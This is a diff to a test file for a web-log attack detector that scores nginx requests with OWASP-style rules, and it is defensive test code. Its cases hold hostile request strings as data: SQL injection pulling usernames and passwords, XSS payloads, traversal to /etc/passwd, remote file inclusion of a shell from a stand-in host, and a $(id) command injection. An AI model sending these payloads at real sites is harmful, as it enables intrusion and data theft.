@@ -1,5 +1,13 @@
-import { describe, it, expect } from 'vitest';
-import { detectAttackPattern, parseAuthLog, parseNginxLog } from '../log-parser.js';
+import { afterEach, describe, it, expect } from 'vitest';
+import {
+  assessNginxRequest,
+  attackSeverity,
+  configureAttackDetection,
+  detectAttackPattern,
+  parseAuthLog,
+  parseNginxLog,
+} from '../log-parser.js';
+import type { NginxLogEntry } from '../../types/events.js';
 
 describe('parseAuthLog', () => {
   it('reads the legacy BSD syslog timestamp', () => {
@@ -59,28 +67,86 @@ describe('parseNginxLog', () => {
   });
 });
 
-describe('detectAttackPattern', () => {
-  it('still catches real remote file inclusion', () => {
-    expect(detectAttackPattern('/index.php?page=http://evil.tld/shell.txt')).toBe('rfi');
-    expect(detectAttackPattern('/?f=php://input')).toBe('rfi');
-  });
+/** A combined-format line for `request` ("GET /path HTTP/1.1"), with optional Referer and User-Agent. */
+function line(request: string, { referer = '-', ua = 'Mozilla/5.0' } = {}): NginxLogEntry {
+  const entry = parseNginxLog(`203.0.113.9 - - [25/Sep/2026:09:19:29 +0000] "${request}" 200 614 "${referer}" "${ua}"`);
+  if (!entry) throw new Error(`unparseable: ${request}`);
+  return entry;
+}
+
+describe('web attack detection (OWASP CRS, PL1)', () => {
+  afterEach(() => configureAttackDetection(undefined));
 
   it('does not call a URL in a query parameter an attack', () => {
     // rssamplifier.com serves exactly this shape to ordinary readers. Flagging
     // it CRITICAL meant auto-defence would ban them.
-    expect(
-      detectAttackPattern('/noticias8islas-com/read?p=https%3A%2F%2Fnoticias8islas.com%2F%3Fp%3D79855'),
-    ).toBeNull();
-    expect(detectAttackPattern('/share?url=https://example.com/post?id=1')).toBeNull();
+    for (const path of [
+      '/rssamplifier/read?p=https://example.com/article',
+      '/noticias8islas-com/read?p=https%3A%2F%2Fnoticias8islas.com%2F%3Fp%3D79855',
+      '/share?url=https://example.com/post?id=1',
+    ]) {
+      const assessment = assessNginxRequest(line(`GET ${path} HTTP/2.0`));
+      expect(assessment.score, path).toBeLessThan(assessment.threshold);
+      expect(attackSeverity(assessment), path).toBeNull();
+    }
   });
 
-  it('still catches the other families', () => {
-    expect(detectAttackPattern('/search?q=1%27+OR+1%3D1')).toBe('sqli');
+  it('puts classic attacks at or over the threshold', () => {
+    const cases: Array<[string, string]> = [
+      ['GET /search?q=1%27+UNION+SELECT+username,password+FROM+users-- HTTP/1.1', 'sqli'],
+      ['GET /item?id=1+AND+SLEEP(5) HTTP/1.1', 'sqli'],
+      ['GET /x?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1', 'xss'],
+      ['GET /x?q=<img%20src=x%20onerror=alert(1)> HTTP/1.1', 'xss'],
+      ['GET /download?file=../../../../etc/passwd HTTP/1.1', 'path_traversal'],
+      ['GET /index.php?page=http://192.0.2.7/shell.txt HTTP/1.1', 'rfi'],
+      ['GET /index.php?page=http://evil.example/shell.txt? HTTP/1.1', 'rfi'],
+      ['GET /x?c=$(id) HTTP/1.1', 'rce'],
+      ['GET /?f=php://input HTTP/1.1', 'php_injection'],
+    ];
+    for (const [request, type] of cases) {
+      const assessment = assessNginxRequest(line(request));
+      expect(assessment.score, request).toBeGreaterThanOrEqual(assessment.threshold);
+      expect(assessment.attackType, request).toBe(type);
+      expect(attackSeverity(assessment), request).not.toBeNull();
+    }
+  });
+
+  it('reads the User-Agent and Referer, not just the request line', () => {
+    expect(assessNginxRequest(line('GET / HTTP/1.1', { ua: 'sqlmap/1.7.2#stable (https://sqlmap.org)' })).attackType).toBe('scanner');
+    const viaReferer = assessNginxRequest(line('GET / HTTP/1.1', { referer: 'https://x.example/?q=<script>alert(1)</script>' }));
+    expect(attackSeverity(viaReferer)).not.toBeNull();
+    // nginx logs an absent header as "-"; that is not a value to inspect.
+    expect(assessNginxRequest(line('GET / HTTP/1.1', { referer: '-', ua: '-' })).score).toBe(0);
+  });
+
+  it('sees a quote nginx logged as \\x22', () => {
+    // 942540 needs the quote itself; without undoing nginx's escaping it
+    // would only ever see the four characters `\x22`.
+    expect(assessNginxRequest(line('GET /?q=x\\x22; HTTP/1.1')).matches.map((m) => m.id)).toContain(942540);
+    expect(assessNginxRequest(line('GET /?q=x; HTTP/1.1')).score).toBe(0);
+  });
+
+  it('scores one CRITICAL rule as high and two or more as critical', () => {
+    const one = assessNginxRequest(line('GET /?f=php://input HTTP/1.1'));
+    expect(one.score).toBe(5);
+    expect(attackSeverity(one)).toBe('high');
+    const several = assessNginxRequest(line('GET /download?file=../../../../etc/passwd HTTP/1.1'));
+    expect(several.score).toBeGreaterThanOrEqual(10);
+    expect(attackSeverity(several)).toBe('critical');
+  });
+
+  it('honours [detection] threshold and rule exclusions', () => {
+    configureAttackDetection({ anomaly_threshold: 10 });
+    const one = assessNginxRequest(line('GET /?f=php://input HTTP/1.1'));
+    expect(one.score).toBe(5);
+    expect(attackSeverity(one)).toBeNull();
+
+    configureAttackDetection({ exclude_rules: [933140] });
+    expect(assessNginxRequest(line('GET /?f=php://input HTTP/1.1')).score).toBe(0);
+  });
+
+  it('keeps detectAttackPattern answering with the attack type', () => {
     expect(detectAttackPattern('/../../etc/passwd')).toBe('path_traversal');
-    expect(detectAttackPattern('/x?q=%3Cscript%3Ealert(1)%3C/script%3E')).toBe('xss');
-  });
-
-  it('leaves ordinary paths alone', () => {
     expect(detectAttackPattern('/topics/rochester/podcasts.rss')).toBeNull();
     expect(detectAttackPattern('/~anthony/blog/139-post.html')).toBeNull();
   });
